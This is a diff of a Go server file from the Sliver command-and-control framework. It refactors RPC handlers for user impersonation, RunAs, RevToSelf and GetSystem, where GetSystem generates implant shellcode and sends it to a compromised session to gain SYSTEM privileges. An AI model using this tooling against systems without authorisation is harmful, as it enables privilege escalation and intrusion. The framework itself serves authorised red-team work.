@@ -19,90 +19,85 @@ package rpc
 */
 
 import (
-	"fmt"
-	"time"
+	"context"
+	"io/ioutil"
 
-	clientpb "github.com/bishopfox/sliver/protobuf/client"
-	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/generate"
 
 	"github.com/golang/protobuf/proto"
 )
 
-func rpcImpersonate(req []byte, timeout time.Duration, resp RPCResponse) {
-	impersonateReq := &sliverpb.ImpersonateReq{}
-	err := proto.Unmarshal(req, impersonateReq)
+// Impersonate - Impersonate a remote user
+func (rpc *Server) Impersonate(ctx context.Context, req *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
+	resp := &sliverpb.Impersonate{}
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	sliver := core.Hive.Sliver(impersonateReq.SliverID)
-	if sliver == nil {
-		resp([]byte{}, fmt.Errorf("Could not find sliver"))
-		return
-	}
-	data, _ := proto.Marshal(&sliverpb.ImpersonateReq{
-		Process:  impersonateReq.Process,
-		Username: impersonateReq.Username,
-		Args:     impersonateReq.Args,
-	})
-
-	data, err = sliver.Request(sliverpb.MsgImpersonateReq, timeout, data)
-	resp(data, err)
+	return resp, nil
 }
 
-func rpcGetSystem(req []byte, timeout time.Duration, resp RPCResponse) {
-	gsReq := &clientpb.GetSystemReq{}
-	err := proto.Unmarshal(req, gsReq)
+// RunAs - Run a remote process as a specific user
+func (rpc *Server) RunAs(ctx context.Context, req *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
+	resp := &sliverpb.RunAs{}
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	sliver := core.Hive.Sliver(gsReq.SliverID)
-	if sliver == nil {
-		resp([]byte{}, fmt.Errorf("Could not find sliver"))
-		return
-	}
-	config := generate.SliverConfigFromProtobuf(gsReq.Config)
-	config.Format = clientpb.SliverConfig_SHARED_LIB
-	config.ObfuscateSymbols = false
-	dllPath, err := generate.SliverSharedLibrary(config)
+	return resp, nil
+}
+
+// RevToSelf - Revert process context to self
+func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
+	resp := &sliverpb.RevToSelf{}
+	err := rpc.GenericHandler(req, resp)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
+	return resp, nil
+}
+
+// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
+func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
+	var shellcode []byte
+	session := core.Sessions.Get(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
+	}
+
+	shellcode, err := getSliverShellcode(req.Config.GetName())
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		config := generate.ImplantConfigFromProtobuf(req.Config)
+		config.Name = ""
+		config.Format = clientpb.ImplantConfig_SHELLCODE
+		config.ObfuscateSymbols = false
+		shellcodePath, err := generate.SliverShellcode(config)
+		if err != nil {
+			return nil, err
+		}
+		shellcode, err = ioutil.ReadFile(shellcodePath)
 	}
-	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
+	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
 		Data:           shellcode,
-		HostingProcess: gsReq.HostingProcess,
-		SliverID:       gsReq.SliverID,
+		HostingProcess: req.HostingProcess,
+		Request:        req.GetRequest(),
 	})
-
-	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
-	resp(data, err)
-
-}
-
-func rpcElevate(req []byte, timeout time.Duration, resp RPCResponse) {
-	elevateReq := &sliverpb.ElevateReq{}
-	err := proto.Unmarshal(req, elevateReq)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	sliver := core.Hive.Sliver(elevateReq.SliverID)
-	if sliver == nil {
-		resp([]byte{}, fmt.Errorf("Could not find sliver"))
-		return
+
+	timeout := rpc.getTimeout(req)
+	data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
+	if err != nil {
+		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.ElevateReq{})
-
-	data, err = sliver.Request(sliverpb.MsgElevateReq, timeout, data)
-	resp(data, err)
-
+	getSystem := &sliverpb.GetSystem{}
+	err = proto.Unmarshal(data, getSystem)
+	if err != nil {
+		return nil, err
+	}
+	return getSystem, nil
 }
